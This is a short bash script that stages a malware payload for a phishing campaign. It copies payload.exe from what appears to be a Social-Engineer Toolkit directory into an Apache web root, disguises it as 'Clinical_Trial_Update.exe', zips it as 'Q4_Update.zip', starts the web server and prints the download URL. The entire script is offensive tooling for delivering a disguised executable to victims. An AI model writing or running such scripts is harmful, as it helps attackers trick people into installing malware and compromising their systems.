#!/bin/bash

cp /root/.set/payload.exe /var/www/html/Clinical_Trial_Update.exe
cd /var/www/html && zip Q4_Update.zip Clinical_Trial_Update.exe
service apache2 start > /dev/null 2>&1
echo "[+] Payload hosted at: http://192.168.1.10/Q4_Update.zip"
